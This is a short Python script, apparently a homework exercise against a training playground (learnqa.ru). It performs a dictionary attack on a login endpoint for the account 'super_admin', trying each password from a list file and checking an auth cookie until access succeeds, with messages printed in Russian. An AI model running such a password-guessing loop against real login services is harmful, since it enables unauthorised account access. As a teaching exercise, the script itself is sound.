import requests

get_password_url = "https://playground.learnqa.ru/ajax/api/get_secret_password_homework"
check_auth_url = "https://playground.learnqa.ru/ajax/api/check_auth_cookie"

login = "super_admin"

list_of_passwords = open('list_of_passwords.txt')

for line in list_of_passwords:
    password = line.rstrip('\n')
    data = {"login": login, "password": password}
    response = requests.post(get_password_url, data=data)

    auth_cookie = response.cookies.get("auth_cookie")

    cookies = {"auth_cookie": auth_cookie}
    check_response = requests.post(check_auth_url, cookies=cookies)

    if check_response.text == "You are authorized":
        print(f"Верный пароль: {password}")
        print(f"Ответ API: {check_response.text}")
        break
    else:
        print(f"Пароль {password} неверный.  Ответ API: {check_response.text}")

else:
    print("Пароль не найден в списке.")